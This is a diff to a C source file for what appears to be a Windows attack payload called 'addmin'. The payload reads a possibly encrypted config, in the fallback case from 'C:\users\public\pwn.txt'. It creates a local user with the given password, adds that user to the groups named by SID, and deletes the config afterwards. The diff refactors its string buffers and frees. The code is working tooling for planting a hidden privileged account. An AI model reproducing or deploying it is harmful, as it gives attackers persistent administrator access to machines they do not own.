@@ -12,7 +12,7 @@
 #pragma comment(lib, "netapi32.lib")
 
 
-#define BUF_SIZE 256
+#define CONFIG_MAX_LINE_LENGTH 256
 #define CONFIG_MAX_SIZE 4096
 
 #define ADDMIN_STATUS_SUCCESS 1
@@ -40,6 +40,9 @@ static uint8_t KEY[16] = { 217, 78, 5, 76, 59, 107, 8, 44, 116, 168, 84, 50, 232
 #define CONFIG_FALLBACK_PATH TEXT("C:\\users\\public\\pwn.txt")
 #endif
 
+WCHAR lineBufUsername[CONFIG_MAX_LINE_LENGTH];
+WCHAR lineBufPassword[CONFIG_MAX_LINE_LENGTH];
+WCHAR lineBufGroupSids[4 * CONFIG_MAX_LINE_LENGTH];
 
 typedef struct _config {
     LPWSTR username;
@@ -71,10 +74,10 @@ int addUserToGroup(LPWSTR userName, LPWSTR groupSIDStr) {
     }
 
     SID_NAME_USE sidType;
-    DWORD cchName = BUF_SIZE;
-    WCHAR groupName[BUF_SIZE];
-    DWORD cchReferencedDomainName = BUF_SIZE;
-    WCHAR referencedDomainName[BUF_SIZE];
+    DWORD cchName = CONFIG_MAX_LINE_LENGTH;
+    WCHAR groupName[CONFIG_MAX_LINE_LENGTH];
+    DWORD cchReferencedDomainName = CONFIG_MAX_LINE_LENGTH;
+    WCHAR referencedDomainName[CONFIG_MAX_LINE_LENGTH];
 
     if (LookupAccountSid(NULL, groupSID, groupName, &cchName, referencedDomainName, &cchReferencedDomainName, &sidType) == FALSE) {
         return ADDMIN_STATUS_ERROR;
@@ -85,11 +88,13 @@ int addUserToGroup(LPWSTR userName, LPWSTR groupSIDStr) {
     return NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&gmInfo, 1) == NERR_Success ? ADDMIN_STATUS_SUCCESS : ADDMIN_STATUS_ERROR;
 }
 
-LPWSTR toWstr(const char* str) {
+BOOL toWstr(const char* str, LPWSTR outBuf, size_t outBufSize) {
     int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
-    LPWSTR wideStr = (LPWSTR)malloc(size * sizeof(WCHAR));
-    MultiByteToWideChar(CP_UTF8, 0, str, -1, wideStr, size);
-    return wideStr;
+    if (size > outBufSize) {
+        return FALSE;
+    }
+    MultiByteToWideChar(CP_UTF8, 0, str, -1, outBuf, size);
+    return TRUE;
 }
 
 int readConfig(LPCWSTR path, uint8_t* outBuf, size_t outBufSize, size_t* bytesRead) {
@@ -138,12 +143,16 @@ int parseConfig(const uint8_t* configBuf, size_t configLen, config* outConfig) {
         size_t cmpLenPassword = min(sizeof(MARKER_PASSWORD) - 1, maxLeft);
         size_t cmpLenGropSids = min(sizeof(MARKER_GROUPSID) - 1, maxLeft);
         if (strncmp(MARKER_USERNAME, lineStart, cmpLenUsername) == 0) {
-            outConfig->username = toWstr(lineStart + min(sizeof(MARKER_USERNAME) - 1, maxLeft));
+            outConfig->username = lineBufUsername;
+            toWstr(lineStart + min(sizeof(MARKER_USERNAME) - 1, maxLeft), lineBufUsername, CONFIG_MAX_LINE_LENGTH);
         } else if (strncmp(MARKER_PASSWORD, lineStart, cmpLenPassword) == 0) {
-            outConfig->password = toWstr(lineStart + min(sizeof(MARKER_PASSWORD) - 1, maxLeft));
+            outConfig->password = lineBufPassword;
+            toWstr(lineStart + min(sizeof(MARKER_PASSWORD) - 1, maxLeft), lineBufPassword, CONFIG_MAX_LINE_LENGTH);
         } else if (strncmp(MARKER_GROUPSID, lineStart, cmpLenGropSids) == 0) {
             if (numGroupsSids < 4) {
-                outConfig->groupSids[numGroupsSids++] = toWstr(lineStart + min(sizeof(MARKER_GROUPSID) - 1, maxLeft));
+                outConfig->groupSids[numGroupsSids] = lineBufGroupSids + (numGroupsSids * CONFIG_MAX_LINE_LENGTH);
+                toWstr(lineStart + min(sizeof(MARKER_GROUPSID) - 1, maxLeft), outConfig->groupSids[numGroupsSids], CONFIG_MAX_LINE_LENGTH);
+                ++numGroupsSids;
             }
         }
 
@@ -182,8 +191,9 @@ int addmin(LPCTSTR configPath, const char *fixedFallback, size_t fixedFallbackLe
     memset(conf.groupSids, 0, sizeof(conf.groupSids));
     parseConfig(configBuf, configSize, &conf);
 
-    int success = addUser(conf.username, conf.password);
-    if (success) {
+
+    int status = addUser(conf.username, conf.password);
+    if (status == ADDMIN_STATUS_SUCCESS) {
         for (size_t i = 0; i < 4; ++i) {
             if (conf.groupSids[i]) {
                 addUserToGroup(conf.username, conf.groupSids[i]);
@@ -193,13 +203,6 @@ int addmin(LPCTSTR configPath, const char *fixedFallback, size_t fixedFallbackLe
             DeleteFile(configPath);
         }
     }
-
-    free(conf.username);
-    free(conf.password);
-    free(conf.groupSids[0]);
-    free(conf.groupSids[1]);
-    free(conf.groupSids[2]);
-    free(conf.groupSids[3]);
 
     return ADDMIN_STATUS_SUCCESS;
 }
